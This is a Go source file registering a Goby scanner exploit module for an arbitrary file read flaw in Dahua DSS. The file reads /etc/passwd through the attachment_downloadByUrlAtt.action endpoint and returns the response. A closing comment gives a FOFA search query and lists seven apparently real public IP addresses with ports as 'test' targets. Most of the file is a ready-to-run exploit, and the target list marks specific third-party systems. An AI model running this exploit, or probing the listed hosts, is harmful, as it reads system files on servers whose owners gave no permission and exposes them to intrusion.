package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "DSS File Read",
    "Description": "http://host/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd\\nhttp://host/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd",
    "Product": "DSS",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2021-05-25",
    "Author": "Goby牛逼",
    "GobyQuery": "title==\"DSS\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": null,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "file",
            "type": "select",
            "value": "readfile"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x:0:0:root:/root:/bin/bash",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x:0:0:root:/root:/bin/bash",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody"
            ]
        }
    ],
    "Tags": [],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10219"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

/***
FOFA:title=="DSS"

test ip
183.129.193.220
222.209.211.56
111.22.166.178
58.213.67.242
58.18.112.98
180.140.114.231
113.229.81.2

test port
50000,88,1000,81,8090
***/
